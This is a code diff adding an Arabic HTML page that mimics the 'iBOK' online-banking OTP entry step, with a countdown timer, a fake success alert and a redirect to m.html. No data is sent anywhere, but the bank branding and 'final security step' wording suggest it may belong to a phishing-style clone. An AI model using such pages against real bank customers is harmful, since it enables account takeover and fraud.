@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إدخال رمز OTP - iBOK</title>
+    <link rel="stylesheet" href="styles.css"> 
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="logo-text">iBOK اي بوك</div>
+            <div class="service-name">الخدمات المصرفية عبر الإنترنت</div>
+        </header>
+
+        <div class="welcome-banner">
+            مرحباً بكم في خدمة iBOK المصرفية عبر الإنترنت
+        </div>
+
+        <div class="form-content-wrapper">
+
+            <div class="form-card">
+                <div class="card-title">إدخال رمز التحقق النهائي</div>
+                <div class="card-subtitle" style="text-align: center; margin-top: 15px;">
+                    يرجى إدخال رمز التحقق لمرة واحدة (OTP) المرسل إلى رقم هاتفك/بريدك الإلكتروني، كخطوة أمان أخيرة.
+                </div>
+
+                <form id="otpForm">
+                    <div class="input-group" style="margin-top: 30px;">
+                        <label class="input-label" for="otp-code">أدخل رمز التحقق (OTP):</label>
+                        <input class="form-input" type="text" id="otp-code" placeholder="أدخل الرمز المكون من 6 أرقام" maxlength="6" required 
+                                inputmode="numeric" pattern="\d{6}">
+                        <span class="input-description" style="display: block; font-size: 13px; color: #777; margin-top: 5px;">أدخل رمز مكون من 6 أرقام</span>
+                    </div>
+
+                    <div class="otp-timer" id="timerDisplay" style="text-align: center; color: #555; font-size: 15px; margin-top: 15px;">
+                        إعادة إرسال الرمز خلال **05:00 دقيقة**
+                    </div>
+                    
+                    <button type="submit" class="submit-button" style="margin-top: 30px;">تأكيد الرمز والدخول</button>
+                </form>
+            </div>
+        </div>
+        </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const initialTime = 300; // 5 دقائق كاملة
+            const timerElement = document.getElementById('timerDisplay');
+            const otpForm = document.getElementById('otpForm');
+            const otpCodeInput = document.getElementById('otp-code');
+
+            if (timerElement) {
+                // سيبدأ المؤقت من 5:00
+                startTimer(initialTime, timerElement);
+            }
+
+            otpForm.addEventListener('submit', (event) => {
+                event.preventDefault(); 
+                const otpCode = otpCodeInput.value.trim();
+
+                if (otpCode.length !== 6 || isNaN(otpCode)) {
+                    alert('الرجاء إدخال رمز تحقق (OTP) صحيح مكون من 6 أرقام.');
+                    otpCodeInput.focus();
+                    return;
+                }
+                
+                // 🚀 التحقق الناجح - التوجيه إلى الصفحة النهائية
+                alert('تم التحقق من الرمز بنجاح! جاري التوجيه إلى لوحة التحكم.');
+                window.location.href = "m.html"; 
+            });
+        });
+
+        function startTimer(duration, displayElement) {
+            let timer = duration;
+            
+            const interval = setInterval(() => {
+                let minutes = parseInt(timer / 60, 10);
+                let remainingSeconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                remainingSeconds = remainingSeconds < 10 ? "0" + remainingSeconds : remainingSeconds;
+
+                displayElement.innerHTML = `إعادة إرسال الرمز خلال **${minutes}:${remainingSeconds} دقيقة**`;
+
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    // 🚩 زر إعادة الإرسال يظهر هنا
+                    displayElement.innerHTML = `انتهى الوقت. <a href="#" onclick="resendOtp(event)" style="color: #d82329; font-weight: bold; text-decoration: none;">إعادة إرسال الرمز؟</a>`;
+                }
+            }, 1000);
+        }
+        
+        // دالة وهمية لإعادة الإرسال (تحتاج إلى كود حقيقي في بيئة الإنتاج)
+        function resendOtp(e) {
+            e.preventDefault();
+            alert("تم إعادة إرسال رمز التحقق إلى جوالك/بريدك الإلكتروني.");
+            // هنا يجب إضافة منطق إعادة تشغيل المؤقت وإرسال الرمز الجديد فعليًا
+            // window.location.reload(); 
+        }
+    </script>
+</body>
+</html>
